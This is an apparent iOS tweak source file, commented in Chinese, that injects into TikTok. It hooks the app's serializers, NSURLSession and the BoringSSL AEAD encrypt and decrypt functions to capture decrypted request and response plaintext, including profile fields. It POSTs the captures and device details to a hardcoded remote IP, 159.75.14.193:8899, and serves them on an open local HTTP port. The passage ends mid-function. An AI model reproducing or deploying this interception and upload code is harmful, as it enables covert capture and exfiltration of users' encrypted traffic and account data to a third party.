// TikTok 个人资料接口抓包插件 (干净版)
// 作者: 海鸥
// 功能: 巨魔注入, 静态hook TTNet序列化层, 抓 profile/self 请求体(明文)+响应(明文protobuf)
// 精准hook点(来自二进制静态分析, 全写死类名, 零枚举):
//   响应: TTHTTPBinaryResponseSerializerBase 及子类 responseObjectForResponse:data:responseError:resultError:
//   请求: TTHTTPRequestSerializerBaseChromium URLRequestWith* -> 返回NSURLRequest的.URL+.HTTPBody(加密前明文)

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <unistd.h>
#import <ifaddrs.h>
#import <zlib.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import "fishhook.h"

// substrate inline hook (ElleKit/CydiaSubstrate 提供, 弱链接: 运行时判断可用性)

// ============ 配置 ============
// 只抓 URL 里含这些关键字的接口 (可多个)
static NSArray *kURLFilters() {
    return @[@"profile/self", @"user/profile"];
}
#define HTTP_PORT 9999

// ============ 日志 ============
// 远程上报服务器
#define LOG_SERVER_URL @"http://159.75.14.193:8899/log"

static void sendLogToServer(NSString *type, NSString *message) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @try {
            NSDictionary *logData = @{
                @"type": type ?: @"info",
                @"message": message ?: @"",
                @"device": [[UIDevice currentDevice] model] ?: @"?",
                @"ios_version": [[UIDevice currentDevice] systemVersion] ?: @"?",
                @"timestamp": @([[NSDate date] timeIntervalSince1970])
            };
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:logData options:0 error:nil];
            if (!jsonData) return;
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:LOG_SERVER_URL]];
            request.HTTPMethod = @"POST";
            request.HTTPBody = jsonData;
            [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
            [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
        } @catch (__unused NSException *e) {}
    });
}

#define HLog(fmt, ...) do { \
    NSString *_m = [NSString stringWithFormat:@"[TKCap] " fmt, ##__VA_ARGS__]; \
    NSLog(@"%@", _m); \
    sendLogToServer(@"info", _m); \
} while(0)

// ============ 全局 ============
static UIWindow *floatingWindow = nil;
static UIButton *floatingButton = nil;
static UIView *controlPanel = nil;
static NSMutableArray *capturedRequests = nil;   // 每条: {time,url,method,requestBody,response,parsed}
static int captureCount = 0;
static CFSocketRef serverSocket = NULL;

// AEAD 诊断计数器 —— 判定 profile/self 到底走没走这两个函数
static volatile long g_open_calls = 0;   // 解密总次数
static volatile long g_seal_calls = 0;   // 加密总次数
static volatile long g_open_sig  = 0;    // 解密命中业务特征
static volatile long g_seal_sig  = 0;    // 加密命中业务特征
static volatile long g_open_max  = 0;    // 见过的最大解密明文长度
static volatile long g_seal_max  = 0;

@interface UIButton (DragSupport)
- (void)handleLongPress:(UILongPressGestureRecognizer *)recognizer;
- (void)onButtonTap:(UITapGestureRecognizer *)recognizer;
- (void)openBrowser:(UIButton *)sender;
- (void)hidePanel:(UIButton *)sender;
@end

// 穿透窗: 只有子视图(按钮)区域响应触摸, 其余全部穿透给下层(TikTok)
// 这是关键 —— 全屏UIWindow若不穿透会吃掉所有触摸, 导致TikTok"卡死"(无法交互)
@interface TKPassWindow : UIWindow
@end
@implementation TKPassWindow
- (BOOL)pointInside:(CGPoint)point withEvent:(UIEvent *)event {
    for (UIView *sub in self.subviews) {
        if (!sub.hidden && sub.userInteractionEnabled && CGRectContainsPoint(sub.frame, point))
            return YES;
    }
    return NO;  // 非子视图区域 -> 不接管, 事件穿透到TikTok
}
@end

// ============ 工具 ============
static UIWindow *getKeyWindow() {
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if ([scene isKindOfClass:[UIWindowScene class]]) {
                for (UIWindow *w in ((UIWindowScene *)scene).windows) {
                    if (w.isKeyWindow) { keyWindow = w; break; }
                }
            }
            if (keyWindow) break;
        }
    }
    if (!keyWindow) {
        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Wdeprecated-declarations"
        keyWindow = [UIApplication sharedApplication].keyWindow;
        #pragma clang diagnostic pop
    }
    return keyWindow;
}

static NSString* getDeviceIP() {
    NSString *address = @"127.0.0.1";
    struct ifaddrs *interfaces = NULL, *temp = NULL;
    if (getifaddrs(&interfaces) == 0) {
        temp = interfaces;
        while (temp != NULL) {
            if (temp->ifa_addr && temp->ifa_addr->sa_family == AF_INET) {
                if ([[NSString stringWithUTF8String:temp->ifa_name] isEqualToString:@"en0"]) {
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp->ifa_addr)->sin_addr)];
                }
            }
            temp = temp->ifa_next;
        }
        freeifaddrs(interfaces);
    }
    return address;
}

static BOOL urlMatches(NSString *url) {
    if (!url) return NO;
    for (NSString *f in kURLFilters()) {
        if ([url containsString:f]) return YES;
    }
    return NO;
}

// NSData -> 可读字符串: 先试utf8, 再附hex head (protobuf二进制)
static NSString* dumpData(NSData *data, NSUInteger maxLen) {
    if (!data || data.length == 0) return @"(empty)";
    NSUInteger len = data.length;
    NSUInteger take = MIN(len, maxLen);
    NSMutableString *out = [NSMutableString stringWithFormat:@"len=%lu\n", (unsigned long)len];

    NSData *slice = [data subdataWithRange:NSMakeRange(0, take)];
    NSString *txt = [[NSString alloc] initWithData:slice encoding:NSUTF8StringEncoding];
    if (txt && txt.length > 0) {
        [out appendFormat:@"[utf8]\n%@\n", txt];
    }
    // hex head
    const unsigned char *bytes = (const unsigned char *)slice.bytes;
    NSUInteger hexLen = MIN(take, 512);
    NSMutableString *hex = [NSMutableString string];
    for (NSUInteger i = 0; i < hexLen; i++) {
        [hex appendFormat:@"%02x", bytes[i]];
        if ((i + 1) % 32 == 0) [hex appendString:@"\n"];
        else if ((i + 1) % 2 == 0) [hex appendString:@" "];
    }
    [out appendFormat:@"[hex head %lu]\n%@", (unsigned long)hexLen, hex];
    return out;
}

// 记录一条抓包
static void recordCapture(NSString *url, NSString *method, NSString *reqBody, NSString *respBody, NSString *parsed) {
    if (!capturedRequests) capturedRequests = [NSMutableArray array];
    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss";
    NSMutableDictionary *item = [@{
        @"time": [fmt stringFromDate:[NSDate date]],
        @"url": url ?: @"",
        @"method": method ?: @"",
    } mutableCopy];
    if (reqBody) item[@"requestBody"] = reqBody;
    if (respBody) item[@"response"] = respBody;
    if (parsed) item[@"parsed"] = parsed;

    @synchronized(capturedRequests) {
        [capturedRequests addObject:item];
        if (capturedRequests.count > 100) [capturedRequests removeObjectAtIndex:0];
        captureCount++;
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        if (floatingButton)
            [floatingButton setTitle:[NSString stringWithFormat:@"抓到\n%d", captureCount] forState:UIControlStateNormal];
    });
    // 只有目标接口(★/profile/self)才远程上报, 避免POST洪水
    BOOL shouldReport = ([url containsString:@"★"] || urlMatches(url));
    if (shouldReport) {
        NSMutableString *full = [NSMutableString stringWithFormat:@"[CAPTURE #%d]\nURL: %@\nMETHOD: %@\n", captureCount, url, method?:@""];
        if (reqBody)  [full appendFormat:@"--- REQ BODY ---\n%@\n", reqBody];
        if (respBody) [full appendFormat:@"--- RESP ---\n%@\n", respBody];
        if (parsed)   [full appendFormat:@"--- PARSED ---\n%@\n", parsed];
        sendLogToServer(@"capture", full);
    }
    NSLog(@"[TKCap] ✅ 抓到第%d条: %@", captureCount, url);
}

// ============ 悬浮窗 ============
static void showControlPanel();
static void hideControlPanel();

static void createFloatingButton() {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (floatingWindow && floatingButton) return;
        floatingWindow = [[TKPassWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
        floatingWindow.windowLevel = UIWindowLevelAlert + 100;
        floatingWindow.backgroundColor = [UIColor clearColor];
        floatingWindow.userInteractionEnabled = YES;
        if (@available(iOS 13.0, *)) {
            for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if ([scene isKindOfClass:[UIWindowScene class]]) { floatingWindow.windowScene = (UIWindowScene *)scene; break; }
            }
        }
        // 关键: 只显示不抢key, 避免劫持TikTok的键盘/焦点/事件链
        floatingWindow.hidden = NO;
        floatingButton = [UIButton buttonWithType:UIButtonTypeCustom];
        floatingButton.frame = CGRectMake(20, 120, 70, 70);
        floatingButton.backgroundColor = [[UIColor systemBlueColor] colorWithAlphaComponent:0.85];
        floatingButton.layer.cornerRadius = 35;
        floatingButton.layer.masksToBounds = YES;
        [floatingButton setTitle:@"抓包\n0" forState:UIControlStateNormal];
        floatingButton.titleLabel.numberOfLines = 2;
        floatingButton.titleLabel.textAlignment = NSTextAlignmentCenter;
        floatingButton.titleLabel.font = [UIFont boldSystemFontOfSize:13];

        UILongPressGestureRecognizer *lp = [[UILongPressGestureRecognizer alloc] initWithTarget:floatingButton action:@selector(handleLongPress:)];
        lp.minimumPressDuration = 0.3;
        [floatingButton addGestureRecognizer:lp];
        UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:floatingButton action:@selector(onButtonTap:)];
        [floatingButton addGestureRecognizer:tap];

        [floatingWindow addSubview:floatingButton];
        floatingWindow.hidden = NO;   // 只可见, 不makeKey
        HLog(@"悬浮窗已创建(穿透窗)");
    });
}

static void showControlPanel() {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (controlPanel) { controlPanel.hidden = NO; return; }
        UIWindow *kw = getKeyWindow();
        if (!kw) return;
        controlPanel = [[UIView alloc] initWithFrame:kw.bounds];
        controlPanel.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.6];

        CGFloat pw = 300, ph = 240;
        UIView *panel = [[UIView alloc] initWithFrame:CGRectMake((kw.bounds.size.width-pw)/2, (kw.bounds.size.height-ph)/2, pw, ph)];
        panel.backgroundColor = [UIColor colorWithRed:0.15 green:0.15 blue:0.15 alpha:1.0];
        panel.layer.cornerRadius = 15;
        panel.layer.masksToBounds = YES;

        UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 18, pw, 28)];
        title.text = @"🎣 TikTok抓包"; title.textColor = [UIColor whiteColor];
        title.font = [UIFont boldSystemFontOfSize:19]; title.textAlignment = NSTextAlignmentCenter;
        [panel addSubview:title];

        UILabel *cnt = [[UILabel alloc] initWithFrame:CGRectMake(20, 58, pw-40, 22)];
        cnt.text = [NSString stringWithFormat:@"已捕获: %d 条", captureCount];
        cnt.textColor = [UIColor colorWithRed:0.6 green:0.9 blue:0.6 alpha:1.0];
        cnt.font = [UIFont systemFontOfSize:15]; cnt.textAlignment = NSTextAlignmentCenter;
        [panel addSubview:cnt];

        UILabel *urll = [[UILabel alloc] initWithFrame:CGRectMake(20, 85, pw-40, 36)];
        urll.text = [NSString stringWithFormat:@"http://%@:%d", getDeviceIP(), HTTP_PORT];
        urll.textColor = [UIColor colorWithRed:0.4 green:0.8 blue:1.0 alpha:1.0];
        urll.font = [UIFont systemFontOfSize:14]; urll.textAlignment = NSTextAlignmentCenter; urll.numberOfLines = 2;
        [panel addSubview:urll];

        UIButton *br = [UIButton buttonWithType:UIButtonTypeSystem];
        br.frame = CGRectMake(30, 130, pw-60, 44);
        [br setTitle:@"📱 Safari查看数据" forState:UIControlStateNormal];
        [br setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        br.titleLabel.font = [UIFont boldSystemFontOfSize:16];
        br.backgroundColor = [UIColor colorWithRed:0.2 green:0.6 blue:1.0 alpha:1.0];
        br.layer.cornerRadius = 10;
        [br addTarget:br action:@selector(openBrowser:) forControlEvents:UIControlEventTouchUpInside];
        [panel addSubview:br];

        UIButton *cl = [UIButton buttonWithType:UIButtonTypeSystem];
        cl.frame = CGRectMake(30, 184, pw-60, 40);
        [cl setTitle:@"关闭" forState:UIControlStateNormal];
        [cl setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        cl.backgroundColor = [UIColor colorWithWhite:0.35 alpha:1.0];
        cl.layer.cornerRadius = 10;
        [cl addTarget:cl action:@selector(hidePanel:) forControlEvents:UIControlEventTouchUpInside];
        [panel addSubview:cl];

        [controlPanel addSubview:panel];
        [kw addSubview:controlPanel];
    });
}

static void hideControlPanel() {
    dispatch_async(dispatch_get_main_queue(), ^{ if (controlPanel) controlPanel.hidden = YES; });
}

// ============ HTTP 服务器 ============
static NSString* htmlEscape(NSString *s) {
    if (!s) return @"";
    s = [s stringByReplacingOccurrencesOfString:@"&" withString:@"&amp;"];
    s = [s stringByReplacingOccurrencesOfString:@"<" withString:@"&lt;"];
    s = [s stringByReplacingOccurrencesOfString:@">" withString:@"&gt;"];
    return s;
}

static NSString* generateHTMLResponse() {
    NSMutableString *h = [NSMutableString string];
    [h appendString:@"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>TikTok抓包</title>"];
    [h appendString:@"<style>body{font-family:monospace;padding:12px;background:#1e1e1e;color:#d4d4d4;}"];
    [h appendString:@".req{background:#2d2d2d;margin:10px 0;padding:12px;border-radius:6px;border-left:4px solid #007acc;}"];
    [h appendString:@"h1{color:#4ec9b0;font-size:18px;}h2{color:#dcdcaa;font-size:14px;margin:8px 0 4px;}"];
    [h appendString:@".url{color:#ce9178;word-break:break-all;}.b{background:#1a1a1a;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;font-size:12px;}</style></head><body>"];
    [h appendFormat:@"<h1>🎣 TikTok抓包 (共%d条)</h1>", captureCount];
    @synchronized(capturedRequests) {
        for (NSDictionary *r in [capturedRequests reverseObjectEnumerator]) {
            [h appendString:@"<div class='req'>"];
            [h appendFormat:@"<h2>📡 %@ %@</h2>", r[@"time"], r[@"method"]?:@""];
            [h appendFormat:@"<p class='url'>%@</p>", htmlEscape(r[@"url"])];
            if (r[@"requestBody"]) { [h appendString:@"<h2>📤 请求体(明文)</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"requestBody"])]; }
            if (r[@"response"])    { [h appendString:@"<h2>📥 响应体(明文)</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"response"])]; }
            if (r[@"parsed"])      { [h appendString:@"<h2>✅ 解析后对象</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"parsed"])]; }
            [h appendString:@"</div>"];
        }
    }
    [h appendString:@"</body></html>"];
    return h;
}

static void handleConnection(CFSocketRef s, CFSocketCallBackType type, CFDataRef address, const void *data, void *info) {
    if (type != kCFSocketAcceptCallBack) return;
    CFSocketNativeHandle sock = *(CFSocketNativeHandle *)data;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        char buf[2048];
        ssize_t n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n > 0) {
            NSString *html = generateHTMLResponse();
            NSData *body = [html dataUsingEncoding:NSUTF8StringEncoding];
            NSString *head = [NSString stringWithFormat:
                @"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n",
                (unsigned long)body.length];
            send(sock, [head UTF8String], [head lengthOfBytesUsingEncoding:NSUTF8StringEncoding], 0);
            send(sock, body.bytes, body.length, 0);
        }
        close(sock);
    });
}

static void startHTTPServer() {
    if (serverSocket) return;
    CFSocketContext ctx = {0, NULL, NULL, NULL, NULL};
    serverSocket = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_STREAM, IPPROTO_TCP,
                                  kCFSocketAcceptCallBack, handleConnection, &ctx);
    if (!serverSocket) { HLog(@"❌ socket创建失败"); return; }
    int yes = 1;
    setsockopt(CFSocketGetNative(serverSocket), SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    struct sockaddr_in addr; memset(&addr, 0, sizeof(addr));
    addr.sin_len = sizeof(addr); addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT); addr.sin_addr.s_addr = htonl(INADDR_ANY);
    CFDataRef ad = CFDataCreate(NULL, (const UInt8 *)&addr, sizeof(addr));
    if (CFSocketSetAddress(serverSocket, ad) != kCFSocketSuccess) {
        HLog(@"❌ 绑定端口%d失败", HTTP_PORT);
        CFRelease(serverSocket); serverSocket = NULL; CFRelease(ad); return;
    }
    CFRelease(ad);
    CFRunLoopSourceRef src = CFSocketCreateRunLoopSource(kCFAllocatorDefault, serverSocket, 0);
    CFRunLoopAddSource(CFRunLoopGetMain(), src, kCFRunLoopCommonModes);
    CFRelease(src);
    HLog(@"✅ HTTP服务器启动 http://设备IP:%d", HTTP_PORT);
}

// ============================================
// 响应侧 hook: binary serializer (protobuf明文)
// 14个类全写死, 挂同一个selector
// -[X responseObjectForResponse:(NSHTTPURLResponse*) data:(NSData*) responseError: resultError:]
// ============================================
// 统一响应处理: 每个类的hook体都调它
static id handleRespSerializer(id response, id data, id retval) {
    @try {
        NSString *url = nil;
        if ([response respondsToSelector:@selector(URL)]) {
            NSURL *u = [response performSelector:@selector(URL)];
            url = u.absoluteString;
        }
        if (urlMatches(url)) {
            NSString *plain = [data isKindOfClass:[NSData class]] ? dumpData(data, 6000) : [NSString stringWithFormat:@"[%@]", [data class]];
            NSString *parsed = nil;
            @try {
                if (retval) {
                    NSString *d = [retval description];
                    parsed = d.length > 8000 ? [d substringToIndex:8000] : d;
                }
            } @catch (__unused NSException *e) {}
            recordCapture(url, @"GET", nil, plain, parsed);
        }
    } @catch (__unused NSException *e) {}
    return retval;
}

// 14个类逐个展开 (顶层%hook, 方法体多行写, 避免logos单行解析bug)

%hook TTHTTPBinaryResponseSerializerBase
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook AWEBinaryResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook AWEBinaryResponseSerializerForJSON
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook AWEFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook BDXBridgePbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook HTSLivePBResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TIMClientTTNetworkImpResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTIMStreakPBResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTKECProtobufResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTKFeedBasePbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTKLandscapePostPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTKLanscapeFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TTKPaidContentPbBaseResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

%hook TikTokKidsFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 {
    id ret = %orig;
    return handleRespSerializer(response, data, ret);
}
%end

// ============================================
// 请求侧 hook: TTHTTPRequestSerializerBaseChromium
// 返回的 NSURLRequest 里 .HTTPBody 是加密前明文
// ============================================

%hook TTHTTPRequestSerializerBaseChromium

- (id)URLRequestWithRequestModel:(id)model commonParams:(id)cp {
    id req = %orig;
    @try {
        if ([req respondsToSelector:@selector(URL)]) {
            NSURL *u = [req performSelector:@selector(URL)];
            NSString *url = u.absoluteString;
            if (urlMatches(url)) {
                NSString *method = [req respondsToSelector:@selector(HTTPMethod)] ? [req performSelector:@selector(HTTPMethod)] : @"?";
                NSData *body = [req respondsToSelector:@selector(HTTPBody)] ? [req performSelector:@selector(HTTPBody)] : nil;
                NSString *bodyStr = body ? dumpData(body, 6000) : @"(无body/model:";
                if (!body && model) bodyStr = [NSString stringWithFormat:@"(无HTTPBody, model=%@)", [model class]];
                recordCapture(url, method, bodyStr, nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return req;
}

- (id)URLRequestWithURL:(id)url headerField:(id)hf params:(id)params method:(id)method constructingBodyBlock:(id)blk commonParams:(id)cp {
    id req = %orig;
    @try {
        if ([req respondsToSelector:@selector(URL)]) {
            NSURL *u = [req performSelector:@selector(URL)];
            NSString *us = u.absoluteString;
            if (urlMatches(us)) {
                NSString *m = [req respondsToSelector:@selector(HTTPMethod)] ? [req performSelector:@selector(HTTPMethod)] : @"?";
                NSData *body = [req respondsToSelector:@selector(HTTPBody)] ? [req performSelector:@selector(HTTPBody)] : nil;
                recordCapture(us, m, body ? dumpData(body, 6000) : @"(无HTTPBody)", nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return req;
}

%end

// ============================================
// NSURLSession hook: 抓走标准HTTPS流量的接口 (Charles能抓的这里也能抓)
// 这层是双保险: 若profile/self不走QUIC而走NSURLSession, 这里必命中
// ============================================

// 判断URL是否值得记录 (TikTok业务域名, 排除静态资源)
static BOOL sessionURLInteresting(NSString *url) {
    if (!url) return NO;
    NSString *low = [url lowercaseString];
    // 排除自己的日志上报服务器 (防止hook递归)
    if ([low containsString:@"159.75.14.193"]) return NO;
    // 排除图片/视频/静态资源
    if ([low containsString:@".jpg"] || [low containsString:@".jpeg"] ||
        [low containsString:@".png"] || [low containsString:@".webp"] ||
        [low containsString:@".mp4"] || [low containsString:@".ttf"] ||
        [low containsString:@".css"] || [low containsString:@".js"] ||
        [low containsString:@"gecko"] || [low containsString:@"/obj/"] ||
        [low containsString:@"maliva"] || [low containsString:@"pstatp"]) return NO;
    // 只要TikTok业务域名/api
    if ([low containsString:@"tiktok"] || [low containsString:@"aweme"] ||
        [low containsString:@"musical"] || [low containsString:@"byteoversea"] ||
        [low containsString:@"/api/"] || [low containsString:@"/tiktok/"]) return YES;
    return NO;
}

%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))completionHandler {
    NSString *urlString = request.URL.absoluteString;
    if (!sessionURLInteresting(urlString) || !completionHandler) {
        return %orig;
    }
    // 请求体 (明文)
    NSString *reqBody = nil;
    if (request.HTTPBody) {
        reqBody = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
        if (!reqBody) reqBody = dumpData(request.HTTPBody, 4000);
    }
    NSString *method = request.HTTPMethod ?: @"GET";
    BOOL isTarget = urlMatches(urlString);   // profile/self 命中 -> 标★

    void (^newHandler)(NSData *, NSURLResponse *, NSError *) = ^(NSData *data, NSURLResponse *response, NSError *error) {
        @try {
            NSString *respBody = nil;
            if (data && data.length > 0) {
                respBody = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                if (!respBody) respBody = dumpData(data, 6000);
                else if (respBody.length > 6000) respBody = [respBody substringToIndex:6000];
            }
            // 目标接口全记; 非目标只在诊断时记URL(留痕, 方便定位走没走这条链)
            NSString *tag = isTarget ? [NSString stringWithFormat:@"[NSURLSession★] %@", urlString] : [NSString stringWithFormat:@"[NSURLSession] %@", urlString];
            recordCapture(tag, method, reqBody, respBody, nil);
        } @catch (__unused NSException *e) {}
        completionHandler(data, response, error);
    };
    return %orig(request, newHandler);
}
%end

// ============ UIButton category ============
@implementation UIButton (DragSupport)
- (void)handleLongPress:(UILongPressGestureRecognizer *)r {
    UIView *v = r.view;
    CGPoint loc = [r locationInView:v.superview];
    if (r.state == UIGestureRecognizerStateBegan || r.state == UIGestureRecognizerStateChanged) v.center = loc;
}
- (void)onButtonTap:(UITapGestureRecognizer *)r { showControlPanel(); }
- (void)openBrowser:(UIButton *)s {
    NSString *u = [NSString stringWithFormat:@"http://%@:%d", getDeviceIP(), HTTP_PORT];
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:u] options:@{} completionHandler:nil];
    hideControlPanel();
}
- (void)hidePanel:(UIButton *)s { hideControlPanel(); }
@end

// ============================================
// 底层AEAD hook (fishhook): 抓QUIC/TLS解密后明文
// EVP_AEAD_CTX_open = 解密, out=收到的明文(响应)
// EVP_AEAD_CTX_seal = 加密, in=发出的明文(请求)
// 所有TLS/QUIC流量必经这两个函数 (crypto.framework导出符号)
// ============================================

typedef int (*aead_open_t)(const void *ctx, uint8_t *out, size_t *out_len, size_t max_out_len,
                           const uint8_t *nonce, size_t nonce_len,
                           const uint8_t *in, size_t in_len,
                           const uint8_t *ad, size_t ad_len);
typedef int (*aead_seal_t)(const void *ctx, uint8_t *out, size_t *out_len, size_t max_out_len,
                           const uint8_t *nonce, size_t nonce_len,
                           const uint8_t *in, size_t in_len,
                           const uint8_t *ad, size_t ad_len);

static aead_open_t orig_aead_open = NULL;
static aead_seal_t orig_aead_seal = NULL;

// 明文buffer里是否含TikTok业务特征 (扫全长, 不再只扫前2KB)
static BOOL bufHasTikTokSignature(const uint8_t *buf, size_t len) {
    if (!buf || len < 8) return NO;
    size_t scan = len < 65536 ? len : 65536;   // 扫前64KB
    static const char *sigs[] = {
        // 目标接口
        "profile/self", "user/profile",
        // 业务路径/域名
        "/aweme/", "/tiktok/", "aweme.v1", "aweme/v1", "/passport/",
        "tiktokv.com", "musical.ly", "musically", "api-va", "api32",
        "api16", "api19", "api21", "tiktokcdn", "byteoversea",
        // 个人资料字段 (protobuf 里以 ASCII key 出现)
        "sec_uid", "unique_id", "sec_user_id", "follower_count",
        "following_count", "aweme_count", "nickname\"", "signature\"",
        "sslocal://", "aweme://", "snssdk", "share_url",
        NULL
    };
    for (size_t i = 0; i + 4 < scan; i++) {
        uint8_t c = buf[i];
        if (c != '/' && c != 's' && c != 'u' && c != 'a' && c != 't' &&
            c != 'm' && c != 'n' && c != 'f' && c != 'p' && c != 'b' && c != 'i')
            continue;   // 快速跳过, 首字母不匹配任一sig
        for (int s = 0; sigs[s]; s++) {
            size_t sl = strlen(sigs[s]);
            if (i + sl <= scan && memcmp(buf + i, sigs[s], sl) == 0) return YES;
        }
    }
    return NO;
}

// gzip解压 (若明文是gzip压缩的body)
static NSData* tryGunzip(const uint8_t *buf, size_t len) {
    if (len < 2 || buf[0] != 0x1f || buf[1] != 0x8b) return nil;  // 非gzip magic
    z_stream s; memset(&s, 0, sizeof(s));
    if (inflateInit2(&s, 16 + MAX_WBITS) != Z_OK) return nil;
    s.next_in = (Bytef *)buf; s.avail_in = (uInt)len;
    NSMutableData *out = [NSMutableData data];
    uint8_t chunk[16384];
    int ret;
    do {
        s.next_out = chunk; s.avail_out = sizeof(chunk);
        ret = inflate(&s, Z_NO_FLUSH);
        if (ret != Z_OK && ret != Z_STREAM_END) { inflateEnd(&s); return out.length ? out : nil; }
        [out appendBytes:chunk length:sizeof(chunk) - s.avail_out];
    } while (ret != Z_STREAM_END && s.avail_in > 0);
    inflateEnd(&s);
    return out;
}

// 处理捕获的明文
static void handleAEADPlain(const uint8_t *buf, size_t len, BOOL isSend) {
    if (!buf || len < 8) return;
    if (!bufHasTikTokSignature(buf, len)) return;   // 只留含特征的

    NSString *body = nil;
    NSData *un = tryGunzip(buf, len);
    if (un) {
        NSString *t = [[NSString alloc] initWithData:un encoding:NSUTF8StringEncoding];
        body = t ? [NSString stringWithFormat:@"[gunzip %lu->%lu]\n%@", (unsigned long)len, (unsigned long)un.length, t.length>6000?[t substringToIndex:6000]:t]
                 : dumpData(un, 6000);
    } else {
        NSData *raw = [NSData dataWithBytes:buf length:(len<8000?len:8000)];
        NSString *t = [[NSString alloc] initWithData:raw encoding:NSUTF8StringEncoding];
        body = t ? (t.length>6000?[t substringToIndex:6000]:t) : dumpData(raw, 6000);
    }
    NSString *tag = [NSString stringWithFormat:@"[AEAD-%@★] len=%lu", isSend?@"SEND":@"RECV", (unsigned long)len];
    recordCapture(tag, isSend?@"SEND":@"RECV", isSend?body:nil, isSend?nil:body, nil);
}

static int my_aead_open(const void *ctx, uint8_t *out, size_t *out_len, size_t max_out_len,
                        const uint8_t *nonce, size_t nonce_len,
                        const uint8_t *in, size_t in_len,
                        const uint8_t *ad, size_t ad_len) {
    int ret = orig_aead_open(ctx, out, out_len, max_out_len, nonce, nonce_len, in, in_len, ad, ad_len);
    @try {
        if (ret == 1 && out && out_len && *out_len >= 16) {
            g_open_calls++;
            if ((long)*out_len > g_open_max) g_open_max = (long)*out_len;
